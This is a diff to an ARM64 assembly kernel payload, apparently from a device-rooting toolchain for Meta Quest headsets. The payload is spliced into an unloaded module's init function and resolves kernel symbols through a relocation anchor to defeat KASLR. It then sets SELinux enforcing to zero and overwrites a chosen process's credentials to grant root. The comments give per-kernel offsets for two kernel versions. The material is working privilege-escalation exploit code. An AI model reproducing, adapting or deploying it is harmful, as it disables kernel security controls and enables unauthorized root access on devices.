@@ -1,10 +1,12 @@
 // Merged enforcing=0 + cred-patch, spliced into a NOT-loaded carrier's init_module (e.g.
-// usbip-vudc, 408B .init.text). Relocation-free: the carrier's own init `bl __platform_driver_register`
-// (kept at the anchor slot, kernel-relocated) is decoded to pdr; find_vpid/pid_task/selinux_state are
-// pdr + per-kernel deltas (from vmlinux). Roots the task pid=<baked>. movz/movk immediates and the
-// anchor CALL26 offset are patched by the builder. @ENF_OFF@ = selinux_state.enforcing byte offset
-// (0 on 5.10, 1 on 4.19), @CRED_OFF@ = task_struct->cred (0x778 on Q3 5.10, 0x7e8 on QPro 4.19);
-// both substituted per-target by build_credmod. cred uid@4..fsgid@32, caps @40/48/56/64/72 (identical).
+// usbip-vudc / rdbg). Relocation-based anchor: the builder points an R_AARCH64_ABS64 reloc at the
+// anchor64 data slot, so the kernel module loader writes the REAL (KASLR-slid) address of
+// __platform_driver_register there at load time. We read it as data -> pdr. This avoids CALL26,
+// which the module loader routes through a PLT veneer when the module is out of direct-branch range
+// (true on Quest Pro 4.19), so decoding the bl would yield the veneer, not the symbol. find_vpid/
+// pid_task/selinux_state/ssuse are pdr + per-kernel deltas (from vmlinux). Roots the task pid=<baked>.
+// movz/movk immediates + the ABS64 anchor are patched by the builder. @ENF_OFF@ = selinux_state.
+// enforcing byte offset (0 on 5.10, 1 on 4.19), @CRED_OFF@ = task_struct->cred (0x778 Q3 / 0x7e8 QPro).
 .section .patch,"ax"
 .globl _start
 _start:
@@ -13,16 +15,14 @@ _start:
     stp x19, x20, [sp, #16]
     stp x21, x22, [sp, #32]
     mov x29, sp
-    // decode anchor bl -> pdr (x19)
-    adr x0, anchor
-    ldr w1, [x0]
-    sbfx x1, x1, #0, #26
-    add x19, x0, w1, sxtw #2
+    // pdr (x19) = &__platform_driver_register, written here by the kernel via R_AARCH64_ABS64
+    adr x0, anchor64
+    ldr x19, [x0]
     b   skip
-anchor:
-    bl  0                        // CALL26 -> __platform_driver_register (patched offset; never executed)
+    .balign 8
+anchor64:
+    .quad 0                      // R_AARCH64_ABS64 -> __platform_driver_register (patched by builder)
 skip:
-@GUARD@
     // enforcing = 0 : selinux_state = pdr + DSEL
     movz w1, #0                  // [P0] DSEL_lo
     movk w1, #0, lsl #16         // [P1] DSEL_hi
